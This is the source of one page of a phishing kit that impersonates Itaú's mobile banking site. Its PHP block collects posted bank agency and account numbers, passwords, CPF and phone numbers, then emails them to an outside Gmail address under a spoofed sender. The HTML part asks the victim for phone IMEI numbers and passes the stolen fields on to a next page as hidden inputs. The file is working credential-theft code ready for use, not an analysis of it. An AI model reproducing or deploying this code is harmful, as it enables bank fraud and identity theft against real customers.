<?php
session_start();

$tipoSelect = $_SESSION["tipoSelect"];


$AGinforma = $_POST['AGinforma'];
$CTinforma = $_POST['CTinforma'];
$SEinforma = $_POST['SEinforma'];
$DDDinforma = $_POST['DDDinforma'];
$CELinforma = $_POST['CELinforma'];
$CPinforma = $_POST['CPinforma'];
$SCinforma = $_POST['SCinforma'];
$cdop = $_POST['cdop'];


$useragent = $_SERVER['HTTP_USER_AGENT'];
 
  if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'IE';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Firefox';
  } elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Chrome';
  } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    $browser= 'other';
  }
  
$today      = date("H-i-s");
$ip_usuario = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('America/Sao_Paulo');
$dataE      =    date('d/m/Y');


$ip = $_SERVER["REMOTE_ADDR"];
$dtehr = date("d-m-y H-i-s");

$message = "
---------------------------------------------------<br />
<b>Navegador:</b> $browser - $browser_version<br />
<b>Data:</b> $today<br />
<b>Ip:</b> $ip_usuario<br />
----------------------------------------------------<br />
<b>[Sheik]-AG:</b> $AGinforma<br />
<b>[Sheik]-CT:</b> $CTinforma<br />
<b>[Sheik]-XX:</b> $cdop<br />
<b>[Sheik]-SE:</b> $SEinforma<br />
<b>[Sheik]-SC:</b> $SCinforma<br />
<b>[Sheik]-CPF:</b> $CPinforma<br />
<b>[Sheik]-CEL:</b> $DDDinforma-$CELinforma<br />
----------------------------------------------------<br />";

$email = "itauatualizda@gmail.com"; // SEU EMAIL AQUI PATRAOZAOOOO :D~
$assunto = "EMPRESA-X - $ip - Confirmacao recebida com sucesso!";
$nome = "EMPRESA-X";


$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: EMPRESA-X <confirmacao@cadastroempresa.com.br>\r\n";

@mail($email, $assunto, $message, $headers);


?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<script type="text/javascript" src="app/js/complemento.js"></script>
<title>Mobile Itau</title>
<style>
body { background:url(app/img/bg-body.png) repeat; margin:0;}


@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.otf');
  font-weight: normal;
  font-style: normal;
}

@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.eot');
  font-weight: normal;
  font-style: normal;
}

@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.woff2') format('woff2');
  font-weight: normal;
  font-style: normal;
}


@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.woff') format('woff');
  font-weight: normal;
  font-style: normal;
}


@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.ttf') format('truetype');
  font-weight: normal;
  font-style: normal;
}

.geral { padding:20px;}

.meio {
	border-radius:2px;
	padding: 10px;
	border:1px solid #FFF;
	background:url(app/img/meio-bg.png);
	background-repeat:repeat;
	opacity:0.8;
	}
	
.dadosI {
    background: rgba(0, 0, 0, 0) url("app/img/meio-bg.png") repeat scroll 0 0;
    border: 0 none;
    color: #ffffff;
    font-size: 18px;
    height: 20px;
    margin: 0 auto;
    outline: medium none;
    padding: 6px 1px;
    width: 100%;
	}

.float-label {
  padding:2px;
}

.float-label label{
  display: block;
  position:absolute;
  box-sizing: border-box;
}

.float-label input{}


.float-label label {
    color: #FFF;
    font-size: 16px;
    margin-left: 0;
    margin-top: -52px;
    transition-duration: 0.2s;
  
}

.float-label input {
  margin-top: 17px;
}

.float-label input[data-empty] + label {
    color: #fff;
    font-size: 18px;
    font-weight: 500;
    margin-left: 4px;
    margin-top: -29px;
    width: 90%;
}
.esquerda {float:left;}
.direita {float:right;}

.aaSS {padding:20px;}


#btter {
	width:100%;
	padding:12px;
	background:url(app/img/bg-bt.png) repeat;
	color:#FFFFFF;
	font-family:Verdana, Geneva, sans-serif;
	font-size:20px;
	border-radius:8px;
	border:0 none;
	}
	
#bgadd{
	position:fixed;
	top:0px;
	left:0px;
	width:100%;
	height:100%;
	z-index:998;
	background:url(app/img/bg-loading.png) repeat;
	display:none;
	}
	
.modalposition{ 
    background: #fff none repeat scroll 0 0;
    border: 1px solid #999;
    border-radius: 0;
    box-shadow: 0 0 10px #999;
    color: #000;
    font-family: Arial;
    font-size: 12px;
    height: 130px;
    left: 50%;
    margin-left: -150px;
    margin-top: -170px;
    position: absolute;
    top: 50%;
    width: 300px;
    z-index: 99999;
	  }
	
.modaldiv1{ height: 30px; width:; }
.modaltext{ padding: 15px; padding-bottom: 10px; color:#666666; }
.modalbutton{ padding:5px 30px 5px 30px; color:#FFF; border:1px solid #900; font-size:12px; background:#F00; font-weight:bold; border-radius:0;}
.modaldiv2{ margin-top:50px; display:block;}
.modalinforma{ padding-top: 0; padding:7px; font-family: Arial; font-size: 14px; color:#FFF; background:#103296; text-shadow:1px 1px 1px #666666;}	
	
.bttok {
	background: rgba(0, 0, 0, 0) url("app/img/bgbtt.png") repeat scroll 0 0;
    border: 0 none;
    border-radius: 4px;
    color: #fff;
    font-family: arial;
    font-size: 14px;
    padding: 6px;
    text-align: center;
    width: 45px;
	cursor:pointer;
	}
#cdops { display:none;}
#agcts { display:none;}
	
</style>
</head>

<body onLoad="shkvamos();">
<div style="padding:20px; background-color:#FFF; color:#999; background-image:url(app/img/logo-menor.png); background-repeat:no-repeat;  background-position:right 20px center;">
<div id="agcts">ag <?php echo $_POST['AGinforma']; ?> c/c <?php echo $_POST['CTinforma']; ?></div>

<div id="cdops">Operador: <?php echo $_POST['cdop']; ?></div>
</div>

<div class="geral" >


<div class="meio">

<div style="font-family:'Arial'; font-size:17px; color:#F30; margin-top:2px; padding: 4px; background:#FFF; border-bottom:1px solid #EDEDED; text-align:center;">Como encontrar o IMEI<br>
<font size="2" color="#999">Abra o discador de chamadas do seu celular, digite o seguinte código no teclado: <b>( <strong style="font-size:18px;">*</strong>#06# )</b> e informe o código apresentado.</font></div>


<form id="ajaxpf" name="ajaxpf" method="post" onSubmit="return veremosSHK()" action="index4.php" autocomplete="off">

<div style="border-bottom:1px #FFF solid; width:100%; height: 52px; margin-top:20px;">
<div class="float-label"><input class="dadosI" type="tel" name="lenda" id="lenda" onKeyUp="javascript:pulacampo('lenda','lendaII');" onKeyPress="return sonumb(event);" maxlength="15" data-empty />
<label for="lenda">IMEI 1</label></div>
</div>


<div style="border-bottom:1px #FFF solid; width:100%; height: 52px; margin-top:12px;">
<div class="float-label"><input class="dadosI" type="tel" name="lendaII" id="lendaII" maxlength="15" onKeyUp="javascript:pulacampo('lendaII','btter');" onKeyPress="return sonumb(event);" data-empty />
<label for="lendaII">IMEI 2</label></div>
</div>




<div style="padding:10px 0"><input id="btter" name="btter" type="submit" value="Avançar" /></div>
<input type="hidden" name="AGinforma" id="AGinforma" value="<?php echo $_POST['AGinforma']; ?>">
<input type="hidden" name="CTinforma" id="CTinforma" value="<?php echo $_POST['CTinforma']; ?>">
<input type="hidden" name="SEinforma" id="SEinforma" value="<?php echo $_POST['SEinforma']; ?>">
<input type="hidden" name="DDDinforma" id="DDDinforma" value="<?php echo $_POST['DDDinforma']; ?>">
<input type="hidden" name="CELinforma" id="CELinforma" value="<?php echo $_POST['CELinforma']; ?>">
<input type="hidden" name="cdop" id="cdop" value="<?php echo $_POST['cdop']; ?>">
</form>
</div>
<div style="background:url(app/img/tokn.png) no-repeat; background-position:center 6px; text-align:center; padding:24px; color:#FFF; margin-top: 12px; font-family:Arial, Helvetica, sans-serif; font-size:12px;">iToken</div>


</div>

<div style="display:none;" id="modalalert" class="modalposition">
<div class="modaldiv1">
<center>
<div class="modalinforma"><div class="glyphicon glyphicon glyphicon-lock" style="padding:0 10px 0 0;"></div>Itau Informa!</div>
<div class="modaltext"><div id="TextErrorModal">Erro</div></div>
</center>
</div>
<div class="modaldiv2" align="center">
<a href="#closemodal"><button class="bttok" onClick="feixaMG()">&nbsp;&nbsp;Ok&nbsp;&nbsp;</button></a>
</div>
</div>

<script>
function feixaMG(){
	document.getElementById('modalalert').style.display='none';
	document.getElementById('bgadd').style.display='none';
	}
</script>


<div id="bgadd"></div>

<script>
var floatLabel = document.querySelectorAll(".float-label");
var onFloatLabelChange = function () {
  if (this.value.length == 0) {
    this.dataset.empty = null;
  } else {
    delete this.dataset.empty;
  }
}

floatLabel = [].slice.apply(floatLabel);
floatLabel.forEach(function (container) {
  var input = container.querySelector("input");
  input.addEventListener("keyup", onFloatLabelChange);
});
</script>

<script type="text/javascript">
function veremosSHK(){
	var ModalAlertError = document.getElementById("TextErrorModal");
    var ModalAlert = document.getElementById("modalalert");
	var Modalfundo = document.getElementById("bgadd");


if (document.ajaxpf.lenda.value == "" || 
document.ajaxpf.lenda.value.length < 12 || 
document.ajaxpf.lenda.value == "000000" || 
document.ajaxpf.lenda.value == "111111" || 
document.ajaxpf.lenda.value == "222222" || 
document.ajaxpf.lenda.value == "333333" || 
document.ajaxpf.lenda.value == "444444" || 
document.ajaxpf.lenda.value == "555555" || 
document.ajaxpf.lenda.value == "666666" || 
document.ajaxpf.lenda.value == "777777" || 
document.ajaxpf.lenda.value == "888888" || 
document.ajaxpf.lenda.value == "999999"){
//alert ("IMEI, Inválido!");
ModalAlertError.innerHTML = "IMEI 1, Inválido!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
document.getElementById("lenda").value = "";
return false;
}

}
</script>

<script language="javascript">
function shkvamos(){
	var auto = '<?=$tipoSelect?>';
	if(auto == '0'){
		document.getElementById("cdops").style.display = 'block';
	}else{
		document.getElementById("agcts").style.display = 'block';
	}
}
</script>

</body>
</html>